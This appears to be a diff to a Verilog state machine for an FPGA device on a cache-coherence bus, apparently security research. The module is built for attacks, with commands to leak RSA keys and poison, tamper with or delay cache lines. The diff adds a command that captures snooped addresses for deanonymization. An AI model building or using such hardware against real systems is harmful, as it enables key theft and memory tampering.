@@ -32,6 +32,7 @@ module devil_controller#(
         (
         input  wire                             ace_aclk,
         input  wire                             ace_aresetn,
+        input  wire                             i_en,
         input  wire                       [3:0] i_cmd,
         input  wire                             i_trigger,
         input  wire      [C_ACE_ADDR_WIDTH-1:0] i_acaddr_snapshot,
@@ -62,6 +63,8 @@ module devil_controller#(
         input  wire                       [31:0] i_word_index,
         input  wire     [C_S_AXI_DATA_WIDTH-1:0] i_delay_reg,
         input  wire                              i_stenden, 
+        output wire                       [15:0] o_deanon_counter,
+        output wire       [C_ACE_ADDR_WIDTH-1:0] o_output_addr,
 
         // Internal Signals, from devil controller to BRAM
         output wire                        		  o_trigger_bram_write,
@@ -88,12 +91,14 @@ module devil_controller#(
                                             DEVIL_PARTIAL_MATCH     = 9,
                                             DEVIL_READ_NEXT_CL      = 10,
                                             DEVIL_TAMPER_CL         = 11,
-                                            DEVIL_DELAY_CR          = 12;
+                                            DEVIL_DELAY_CR          = 12,
+                                            DEVIL_DEANON_ADDR       = 13;
 
     `define CMD_LEAK        0
     `define CMD_POISON      1
     `define CMD_TAMPER_CL   2
     `define CMD_DELAY_CR    3
+    `define CMD_DEANON      4
     `define CL_LINE_BYTES   64
     `define CL_LINE_BITS    `CL_LINE_BYTES*8 // 512 bits
     `define PEM_SIZE        32'h6C0*8  // Number of bits to fetch -> Enough for a RSA key with 2048 bits
@@ -123,6 +128,8 @@ module devil_controller#(
     reg                              r_internal_adl_en;
     reg                              r_internal_adt_en;
     reg                              r_trigger_active;
+    reg                       [15:0] r_deanon_counter;
+    reg       [C_ACE_ADDR_WIDTH-1:0] r_output_addr;
     reg   [(C_ACE_DATA_WIDTH*4)-1:0] r_pattern;
     reg                        [4:0] r_pattern_size;
     reg                        [4:0] r_pattern_size_save;
@@ -162,12 +169,15 @@ module devil_controller#(
     assign o_bram_addr              = r_bram_addr;
     assign o_bram_data              = r_bram_data;
 
+    assign o_deanon_counter = r_deanon_counter;
+    assign o_output_addr    = r_output_addr;
+
 //------------------------------------------------------------------------------
 // FSM
 //------------------------------------------------------------------------------
     always @(posedge ace_aclk)
     begin
-    if(~ace_aresetn)
+    if(~ace_aresetn || !i_en)
         begin
         fsm_devil_controller <= DEVIL_IDLE;
         r_reply <= 0;
@@ -177,9 +187,11 @@ module devil_controller#(
         r_bram_addr <= 0;
         r_bram_data <= 0;
         r_active_func <= 0;
+        r_output_addr <= 0;
         r_match_offset <= 0;
         r_pattern_size <= 0;
         r_trigger_active <= 0;
+        r_deanon_counter <= 0;
         r_internal_adl_en <= 0;
         r_internal_adt_en <= 0;
         r_save_cache_line <= 0;
@@ -311,9 +323,13 @@ module devil_controller#(
                         end
                         `CMD_DELAY_CR  : 
                         begin
-                            fsm_devil_controller <= DEVIL_DELAY_CR;
+                            fsm_devil_controller <= DEVIL_DELAY_CR; 
                         end
-                        default : fsm_devil_controller <= DEVIL_END_OP; 
+                        `CMD_DEANON  : 
+                        begin
+                            fsm_devil_controller <= DEVIL_DEANON_ADDR; 
+                        end
+                        default : fsm_devil_controller <= DEVIL_END_OP;  // this should go to DEVIL_REPLY no???
                     endcase                                                      
                 end
             DEVIL_LEAK_KEY: // 3
@@ -434,6 +450,12 @@ module devil_controller#(
                         r_counter <= r_counter + 1;
                         fsm_devil_controller <= fsm_devil_controller;
                     end                                
+                end
+            DEVIL_DEANON_ADDR: // 13  
+                begin 
+                    r_output_addr <= i_acaddr_snapshot;
+                    r_deanon_counter <= r_deanon_counter + 1;
+                    fsm_devil_controller <= DEVIL_REPLY;  
                 end
             DEVIL_REPLY:  // 7
                 begin 
